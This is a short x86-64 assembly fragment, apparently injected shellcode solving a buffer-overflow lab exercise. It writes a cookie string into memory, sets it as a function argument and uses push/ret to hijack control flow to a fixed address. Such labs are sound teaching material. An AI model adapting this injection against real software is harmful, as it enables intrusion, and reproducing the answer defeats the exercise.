mov     $0x55586000,%rdi
mov     $0x39623935,%rax
mov     $0x61663739,%rcx
mov     %rax,(%rdi)
mov     %rcx,0x4(%rdi)
push    $0x4018fa
ret
